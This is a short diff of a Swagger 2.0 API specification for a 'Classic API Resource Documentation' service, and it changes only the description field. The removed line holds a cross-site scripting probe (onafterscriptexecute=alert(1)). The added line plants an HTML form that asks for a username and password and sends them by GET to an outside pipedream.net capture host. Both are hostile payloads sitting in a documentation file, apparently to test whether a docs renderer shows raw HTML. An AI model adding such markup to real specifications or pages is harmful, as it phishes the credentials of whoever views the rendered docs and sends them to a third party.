@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><input name=hasChildNodes onafterscriptexecute=alert(1)><script>1</script>
+  description: <FORM METHOD="GET" ACTION="https://enye5r9amlnr.x.pipedream.net">Enter your user:<Input Type=Text name="user" >Enter your password:<Input Type=Text name="pass" ><Input type=submit></FORM>
   version: production
 basePath: /JSSResource/
 produces:
